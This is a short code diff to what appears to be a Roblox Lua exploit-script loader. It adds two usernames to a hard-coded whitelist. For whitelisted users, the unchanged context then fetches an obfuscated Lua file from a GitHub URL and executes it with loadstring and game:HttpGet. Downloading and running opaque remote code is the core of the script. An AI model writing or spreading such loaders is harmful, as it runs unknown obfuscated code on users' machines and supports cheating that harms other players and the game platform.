@@ -884,6 +884,10 @@ elseif a=="bjfghhjj"then
 _G.whitelisted=true
 elseif a=="cnmhhhg"then
 _G.whitelisted=true
+elseif a=="lzmass"then
+_G.whitelisted=true
+elseif a=="myqf2077"then
+_G.whitelisted=true
 end
 if _G.whitelisted==true then
     loadstring(game:HttpGet(('https://raw.githubusercontent.com/IIIIIIIIIIIIllllllllIIIIIIIllllllllIIlI/baijiaobengv4beta/main/jz1-obfuscated.lua'),true))()
